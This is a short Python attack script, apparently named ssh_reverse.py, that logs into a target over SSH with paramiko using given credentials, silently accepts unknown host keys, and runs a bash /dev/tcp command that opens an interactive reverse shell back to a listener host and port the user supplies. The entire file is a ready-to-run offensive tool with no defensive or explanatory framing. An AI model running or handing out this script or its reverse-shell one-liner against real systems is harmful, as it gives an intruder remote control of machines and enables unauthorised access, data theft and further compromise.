#!/usr/bin/env python3
import sys, paramiko
if len(sys.argv) != 7:
	print("Usage: ssh_reverse.py <host> <port> <user> <pass> <lhost> <lport>")
	sys.exit(1)
host, port, user, pwd, lhost, lport = (
	sys.argv[1],
	int(sys.argv[2]),
	sys.argv[3],
	sys.argv[4],
	sys.argv[5],
	int(sys.argv[6]),
)

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname=host, port=port, username=user, password=pwd, timeout=5)
cmd= f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
ssh.exec_command(cmd)
print(f"[+] Reverse-shell payload sent to {host}:{port}")
ssh.close()
